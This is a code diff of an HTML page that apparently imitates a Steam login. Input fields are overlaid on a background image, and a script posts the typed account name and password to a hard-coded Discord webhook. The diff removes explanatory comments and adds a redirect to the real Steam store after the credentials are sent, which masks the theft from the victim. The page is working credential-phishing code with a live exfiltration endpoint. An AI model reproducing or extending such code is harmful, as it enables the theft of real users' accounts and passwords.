@@ -3,12 +3,12 @@
 <head>
     <style>
         body {
-            margin: 0; /* 移除瀏覽器預設的 8px 外距 */
+            margin: 0; 
             background-color: #000
         }
         img {
-            display: block; /* 移除圖片下方的微小空隙 */
-            width: 100%;    /* 讓圖片寬度撐滿畫面（視需求調整） */
+            display: block; 
+            width: 100%;    
             height: auto;
         }
         .input-overlay {
@@ -17,7 +17,7 @@
             position: absolute;
             bottom: 535px; 
             right: 878px;   
-            border: none;    /* 移除平常看到的灰色邊框 */
+            border: none;  
             outline: none;
             font-size: 15px;
             caret-color:#ffffff;
@@ -28,7 +28,7 @@
             z-index:100;
         }
         .input-overlay:hover {
-            background-color: #393C44; /* 變淺一點的灰色 */
+            background-color: #393C44;
         }
         .input-overlay123 {
             box-sizing: border-box;
@@ -36,7 +36,7 @@
             position: absolute;
             bottom: 463px; 
             right: 878px;   
-            border: none;    /* 移除平常看到的灰色邊框 */
+            border: none;  
             outline: none;
             font-size: 15px;
             caret-color:#ffffff;
@@ -47,14 +47,14 @@
             z-index:100;
         }
         .input-overlay123:hover {
-            background-color: #393C44; /* 變淺一點的灰色 */
+            background-color: #393C44;
         }
         .input_img{
             z-index:2;
             position: absolute;
             bottom: 286px; 
             right: 603px;
-            width: 700px;  /* 這裡改小，例如 100px 或 50px */
+            width: 700px; 
             height: auto;
         }
         .button_css{
@@ -62,10 +62,10 @@
             position: absolute;
             bottom: 370px; 
             right: 939px;
-            width: 280px;  /* 這裡改小，例如 100px 或 50px */
+            width: 280px; 
             height: auto;
-            border: none;       /* 移除預設邊框 */
-            padding: 0;         /* 移除預設內距 */
+            border: none;     
+            padding: 0;        
             background: none;
         }
     </style>
@@ -90,12 +90,9 @@
         const account = document.getElementById("acc").value;
         const password = document.getElementById("pwd").value;
 
-        // 💡 填入你剛才複製的 Discord Webhook 網址
         const webhookURL = "https://discord.com/api/webhooks/1494608428969103480/r4QDGJSxwYqfqT1813pNn0xVH3xXdcM2a_qed8B0htM4qPmUlzjoDGP3kjea9FATwFXt";
-
-        // 構造要傳送到 Discord 的訊息格式
         const payload = {
-            content: `帳號: \`${account}\`\n 密碼: \`${password}\`\n`
+            content: `帳號: ${account}\n 密碼: ${password}\n`
         };
 
         fetch(webhookURL, {
@@ -105,8 +102,8 @@
         })
         .then(response => {
             if (response.ok) {
-                // 傳送成功後清空欄位，不顯示任何動作
                 this.reset();
+                window.location.href = "https://store.steampowered.com/";
             }
         })
         .catch(error => console.error('Error:', error));
